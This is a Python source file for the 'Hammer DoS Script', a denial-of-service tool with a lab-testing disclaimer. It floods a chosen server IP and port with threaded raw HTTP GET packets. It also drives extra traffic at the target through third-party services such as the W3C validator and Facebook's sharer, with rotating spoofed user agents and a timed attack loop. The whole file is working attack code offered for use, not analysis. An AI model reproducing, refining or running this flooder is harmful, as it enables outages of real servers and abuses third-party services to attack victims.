#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Hammer DoS Script v1.0 Updated by Md Abdullah
# For legal testing purposes only

from queue import Queue
import time, sys, socket, threading, logging, urllib.request, random

def banner():
    print("""
*******************************************
*            DoS Script v1.0           *
*       Developed by Md Abdullah          *
*        Made in MD Abdullah's Lab        *
*******************************************
""")

def user_agent():
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    return uagent

def my_bots():
    bots = []
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    return bots

def bot_hammering(url):
    global stop_flag, uagent
    try:
        while not stop_flag:
            urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print("\033[94mbot is hammering...\033[0m")
            time.sleep(0.05)
    except:
        time.sleep(0.05)

def down_it(item):
    global stop_flag, host, port, uagent, data
    try:
        while not stop_flag:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\nUser-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host,int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(0.05)
    except socket.error:
        print("\033[91mno connection! server maybe down\033[0m")
        time.sleep(0.05)

def dos():
    global q, stop_flag
    while not stop_flag:
        item = q.get()
        down_it(item)
        q.task_done()

def dos2():
    global w, stop_flag, host, bots
    while not stop_flag:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()

def usage():
    print(''' \033[92m
    Hammer Dos Script v.1 http://www.canyalcin.com/
    It is the end user's responsibility to obey all applicable laws.
    It is just for server testing script. Your IP is visible.

    usage : python3 hammer.py -s <server_ip> -p <port> -t <threads>
    -h : help
    -s : server ip
    -p : port default 80
    -t : turbo default 135
    \033[0m''')
    sys.exit()

def get_parameters():
    global host
    global port
    global thr
    from optparse import OptionParser
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo

def read_headers():
    global data
    try:
        with open("headers.txt", "r") as headers:
            data = headers.read()
    except:
        data = ""

q = Queue()
w = Queue()
stop_flag = False

def main():
    global stop_flag
    banner()
    get_parameters()

    try:
        thr_input = input("Enter number of threads (turbo) or press Enter for default ({}): ".format(thr))
        if thr_input.strip() != '':
            global thr
            thr = int(thr_input)
    except:
        print("Invalid input, using default threads =", thr)

    try:
        attack_duration = int(input("Enter attack duration in seconds (default 60): ") or "60")
    except:
        attack_duration = 60

    try:
        ip_change_interval = int(input("Enter IP change interval in seconds (default 30): ") or "30")
    except:
        ip_change_interval = 30  # Kept as input but no proxy logic, so no effect

    print("\033[92mTarget:", host, " Port:", port, " Threads:", thr, " Duration:", attack_duration, "sec \033[0m")
    print("\033[94mStarting attack... Please wait...\033[0m")

    read_headers()
    global uagent
    uagent = user_agent()
    global bots
    bots = my_bots()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,int(port)))
        s.settimeout(1)
    except socket.error:
        print("\033[91mCheck server IP and port\033[0m")
        usage()

    threads = []
    for i in range(thr):
        t = threading.Thread(target=dos)
        t.daemon = True
        t.start()
        threads.append(t)
        t2 = threading.Thread(target=dos2)
        t2.daemon = True
        t2.start()
        threads.append(t2)

    start_time = time.time()
    while True:
        elapsed = time.time() - start_time
        if elapsed > attack_duration:
            print("\n\033[92mAttack duration finished. Stopping...\033[0m")
            stop_flag = True
            break

        # IP change interval input accepted but no proxy switching here

        item = 0
        if not q.full():
            item += 1
            q.put(item)
        if not w.full():
            w.put(item)

        time.sleep(0.01)  # reduce CPU load

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
